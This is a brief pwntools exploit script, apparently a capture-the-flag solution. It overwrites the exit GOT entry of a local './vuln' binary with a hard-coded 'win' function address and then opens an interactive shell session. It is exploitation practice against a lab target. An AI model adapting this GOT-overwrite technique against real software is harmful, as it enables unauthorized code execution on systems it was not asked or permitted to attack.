from pwn import *

context.log_level = 'debug'

sh = process("./vuln")
bin = ELF("./vuln")
# sh = process("/problems/got_3_4ba3deeda2ea9b203c6a6425f183e7ed/vuln")
# bin = ELF("/problems/got_3_4ba3deeda2ea9b203c6a6425f183e7ed/vuln")

# puts_got = bin.got['puts']
# exit_got = bin.exit['exit']
puts_got = int('0x804a018',16)
exit_got = int('0x0804a01c',16)
win_addr = int('0x080485c6',16)
print(p32(puts_got))
print(p32(exit_got))
print(p32(win_addr))
sh.recv()
sh.sendline(str(exit_got))
sh.recv()
sh.sendline(str(win_addr))

sh.interactive()
